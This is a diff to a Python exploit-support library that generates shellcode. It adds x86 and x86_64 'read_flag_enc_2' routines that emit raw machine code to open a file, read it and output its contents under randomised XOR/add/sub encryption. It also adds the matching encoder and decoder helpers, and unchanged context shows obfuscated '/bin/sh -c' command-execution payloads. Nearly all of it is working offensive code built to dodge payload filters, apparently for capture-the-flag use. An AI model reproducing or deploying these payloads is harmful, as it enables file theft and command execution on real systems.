@@ -1,13 +1,14 @@
 #!/usr/bin/python
 from __future__ import print_function
 from struct import *
+from ctypes import *
 from capstone import *
 import os
 # a collection of shellcode use regulary on exploit code.
 
 NOPs_X86 = '\x90'
 
-def xor(msg,key):
+def xor_str(msg,key):
 	enc = []
 
 	for i,c in enumerate(msg):
@@ -29,6 +30,85 @@ def gen_key_pair(length,size_of_key):
 			tmp = os.urandom(size_of_key)
 		key.append(tmp)
 	return key
+
+# ultilities function
+def num_add(v1,v2,mode):
+	uint = c_uint64 if mode else c_uint32
+	return uint(v1 + v2).value
+
+def num_sub(v1,v2,mode):
+	uint = c_uint64 if mode else c_uint32
+	return uint(v1 - v2).value
+
+def num_xor(v1,v2,mode):
+	uint = c_uint64 if mode else c_uint32
+	return uint(v1 ^ v2).value
+
+def _unpack(v,mode):
+	if mode:
+		return unpack('<Q',v)[0]
+	else:
+		return unpack('<I',v)[0]
+
+def _pack(v,mode):
+	if mode:
+		return pack('<Q',v)
+	else:
+		return pack('<I',v)
+
+def add_str(msg,key,mode = 0):
+	enc = []
+
+	# init offset
+	off = 8 if mode else 4
+
+	# padding message is multiple of 4 or 8
+	while len(msg) % off:
+		msg += os.urandom(1)
+
+	key = _unpack(key,mode)
+	for i in xrange(0,len(msg),off):
+		v = _unpack(msg[i:i+off],mode)
+		v1 = num_add(v,key,mode)
+		enc.append(_pack(v1,mode))
+
+	return ''.join(enc)
+
+def sub_str(msg,key,mode = 0):
+	enc = []
+
+	# init offset
+	off = 8 if mode else 4
+
+	# padding message is multiple of 4 or 8
+	while len(msg) % off:
+		msg += os.urandom(1)
+
+	key = _unpack(key,mode)
+	for i in xrange(0,len(msg),off):
+		v = _unpack(msg[i:i+off],mode)
+		v1 = num_sub(v,key,mode)
+		enc.append(_pack(v1,mode))
+
+	return ''.join(enc)
+
+def decrypt(cipher,key,step_funcs,mode = 0):
+	# init off
+	off = 8 if mode else 4
+
+	while len(cipher) % off:
+		cipher += '\x00'
+
+	msg = ''
+	key = _unpack(key,mode)
+
+	for i in xrange(0,len(cipher),off):
+		v = _unpack(cipher[i:i+off],mode)
+		for func in step_funcs:
+			v = func(v,key,mode)
+		msg += _pack(v,mode)
+
+	return msg
 
 class Shellcode(str):
 	mode = 0
@@ -157,9 +237,49 @@ class x86:
 		read_flag = read_flag.replace('AAAA',key[0])
 		read_flag = read_flag.replace('BBBB',key[1])
 		read_flag = read_flag.replace('DDDD',key[2])
-		read_flag = read_flag.replace('concat',xor(filepath,key[2]))
+		read_flag = read_flag.replace('concat',xor_str(filepath,key[2]))
 
 		return Shellcode(read_flag),key[1]+key[0]
+
+	def read_flag_enc_2(self,filepath):
+		# generate key
+		keys = gen_key_pair(3,4) # gen 3 keys with 4 bytes for each key
+
+		key_fn_enc = keys[2]
+		key_flag_enc = xor_str(keys[0],keys[1])
+
+		enc_fn_steps = {
+			'\x31\x2b' : xor_str, # xor
+			'\x01\x2b' : sub_str, # add
+			'\x29\x2b' : add_str, # sub
+		}
+
+		enc_flag_steps = {
+			'\x31\x37\x01\x37\x01\x37' : [num_sub,num_sub,num_xor], # xor add add
+			'\x01\x37\x01\x37\x31\x37' : [num_xor,num_sub,num_sub], # add add xor
+			'\x01\x37\x31\x37\x01\x37' : [num_sub,num_xor,num_sub], # add xor add
+			'\x31\x37\x29\x37\x29\x37' : [num_add,num_add,num_xor], # xor sub sub
+			'\x29\x37\x29\x37\x31\x37' : [num_xor,num_add,num_add], # sub sub xor
+			'\x29\x37\x31\x37\x29\x37' : [num_add,num_xor,num_add]  # sub xor sub
+		}
+
+		sc = 'hCCCChAAAAhBBBB^_]1\xfe1\xc0\x83\xc0\x10\xc1\xe0\x08)\xc4\xeb\x04\x8b\x1c$'
+		sc+= '\xc3\xe8\xf7\xff\xff\xff\x83\xc3NS1\xc9\x83\xc1\x10\xc1\xe1\x041+\x83\xc3\x04'
+		sc+= '\x83\xe9\x04\x85\xc9u\xf4[1\xc9j\x05X\xcd\x80P[\x83\xc1\x10\xc1\xe1\x04QZTYj\x03X'
+		sc+= '\xcd\x80QQ_RY17\x017)7\x83\xc7\x04\x83\xe9\x04\x85\xc9u\xf01\xdbYj\x04X\xcd\x80concat'
+		
+		# modify original shellcode
+		enc_fn = enc_fn_steps.keys()[ord(os.urandom(1)) % len(enc_fn_steps)]
+		sc = sc.replace('AAAA',keys[0])
+		sc = sc.replace('BBBB',keys[1])
+		sc = sc.replace('CCCC',keys[2])
+		sc = sc.replace('\x31\x2b',enc_fn)
+		sc = sc.replace('concat',enc_fn_steps[enc_fn](filepath + '\x00',key_fn_enc))
+
+		enc_order = enc_flag_steps.keys()[ord(os.urandom(1)) % len(enc_flag_steps)]
+		sc = sc.replace('\x31\x37\x01\x37\x29\x37',enc_order)
+
+		return Shellcode(sc),key_flag_enc,enc_flag_steps[enc_order]
 
 	def exec_enc_command(self,command):
 		'''
@@ -177,12 +297,12 @@ class x86:
 		sc = sc.replace('AAAA',key[0])
 		sc = sc.replace('BBBB',key[1])
 		sc = sc.replace('CCCC',key[2])
-		sc = sc.replace('PPPP',xor('//sh',key[2]))
-		sc = sc.replace('QQQQ',xor('/bin',key[2]))
-		sc = sc.replace('RRRR',xor('-c\x00\x00',key[2]))
+		sc = sc.replace('PPPP',xor_str('//sh',key[2]))
+		sc = sc.replace('QQQQ',xor_str('/bin',key[2]))
+		sc = sc.replace('RRRR',xor_str('-c\x00\x00',key[2]))
 
 		command += '\x00'
-		sc = sc.replace('ls',xor(command,key[0] + key[1]))
+		sc = sc.replace('ls',xor_str(command,key[0] + key[1]))
 
 		return Shellcode(sc)
 
@@ -242,9 +362,51 @@ class x86_64:
 		read_flag = read_flag.replace('CCCC',key[1])
 		read_flag = read_flag.replace('BBBB',key[0])
 		read_flag = read_flag.replace('PPPP',key[3])
-		read_flag = read_flag.replace('concat',xor(filepath,key[3]))
+		read_flag = read_flag.replace('concat',xor_str(filepath,key[3]))
 
-		return Shellcode(read_flag,1),key[0] + key[2] + key[1] + xor(xor(key[1],key[2]),key[0])
+		return Shellcode(read_flag,1),key[0] + key[2] + key[1] + xor_str(xor_str(key[1],key[2]),key[0])
+
+	def read_flag_enc_2(self,filepath):
+		# generate keys
+		keys = gen_key_pair(4,4) # gen 4 keys with size is 4 bytes long
+
+		sc = 'hPPPPhAAAAhCCCChBBBBAXAYAZA_I\xc1\xe1 I\xc1\xe0 I\xc1\xe8 M\t\xc1I\xc1\xe7 I\xc1\xe2 I'
+		sc+= '\xc1\xea M\t\xd7H1\xc0H\x83\xc0\x10H\xc1\xe0\x08H)\xc4\xeb\x05H\x8b\x1c$\xc3\xe8\xf6\xff'
+		sc+= '\xff\xffH\x83\xc3bS_H1\xc9H\x83\xc1\x10H\xc1\xe1\x04L1;H\x83\xc3\x08H\x83\xe9\x08H\x85\xc9'
+		sc+= 'u\xf0H1\xf6j\x02X\x0f\x05P_T^H1\xd2H\x83\xc2\x10H\xc1\xe2\x04H1\xc0\x0f\x05V[RYL1\x0bL\x01'
+		sc+= '\x0bL)\x0bH\x83\xc3\x08H\x83\xe9\x08H\x85\xc9u\xeaH1\xffH1\xc0H\xff\xc0\x0f\x05concat'
+
+		key_fn_enc = keys[2] + keys[3]
+		key_flag_enc = keys[1] + keys[0]
+
+		enc_flag_steps = {
+			'\x4c\x31\x0b\x4c\x01\x0b\x4c\x01\x0b':[num_sub,num_sub,num_xor], # xor add add
+			'\x4c\x01\x0b\x4c\x01\x0b\x4c\x31\x0b':[num_xor,num_sub,num_sub], # add add xor
+			'\x4c\x01\x0b\x4c\x31\x0b\x4c\x01\x0b':[num_sub,num_xor,num_sub], # add xor add
+			'\x4c\x31\x0b\x4c\x29\x0b\x4c\x29\x0b':[num_add,num_add,num_xor], # xor sub sub
+			'\x4c\x29\x0b\x4c\x29\x0b\x4c\x31\x0b':[num_xor,num_add,num_add], # sub sub xor
+			'\x4c\x29\x0b\x4c\x31\x0b\x4c\x29\x0b':[num_add,num_xor,num_add], # sub xor sub
+		}
+
+		enc_fn_steps = {
+			'\x4c\x31\x3b' : xor_str, # xor
+			'\x4c\x01\x3b' : sub_str, # add
+			'\x4c\x29\x3b' : add_str, # sub
+		}
+
+		# replace original shellcode
+		enc_fn = enc_fn_steps.keys()[ord(os.urandom(1)) % len(enc_fn_steps)]
+		sc = sc.replace('\x4c\x31\x3b',enc_fn)
+		sc = sc.replace('PPPP',keys[3])
+		sc = sc.replace('AAAA',keys[2])
+		sc = sc.replace('BBBB',keys[1])
+		sc = sc.replace('CCCC',keys[0])
+		sc = sc.replace('concat',enc_fn_steps[enc_fn](filepath + '\x00',key_fn_enc,1))
+
+		enc_order = enc_flag_steps.keys()[ord(os.urandom(1)) % len(enc_flag_steps)]
+		sc = sc.replace('\x4c\x31\x0b\x4c\x01\x0b\x4c\x29\x0b',enc_order)
+
+		return Shellcode(sc,1),key_flag_enc,enc_flag_steps[enc_order]
 
 	def exec_enc_command(self,command):
 		'''
@@ -263,12 +425,12 @@ class x86_64:
 		sc = sc.replace('CCCC',key[1])
 		sc = sc.replace('DDDD',key[0])
 
-		sc = sc.replace('PPPP',xor('//sh',key[4]))
-		sc = sc.replace('QQQQ',xor('/bin',key[4]))
-		sc = sc.replace('RRRR',xor('-c\x00\x00',key[4]))
+		sc = sc.replace('PPPP',xor_str('//sh',key[4]))
+		sc = sc.replace('QQQQ',xor_str('/bin',key[4]))
+		sc = sc.replace('RRRR',xor_str('-c\x00\x00',key[4]))
 		sc = sc.replace('SSSS',key[4])
 
-		sc = sc.replace('ls',xor(command + '\x00',xor(key[1] + key[0],key[3] + key[2])))
+		sc = sc.replace('ls',xor_str(command + '\x00',xor_str(key[1] + key[0],key[3] + key[2])))
 
 		return Shellcode(sc,1)
 
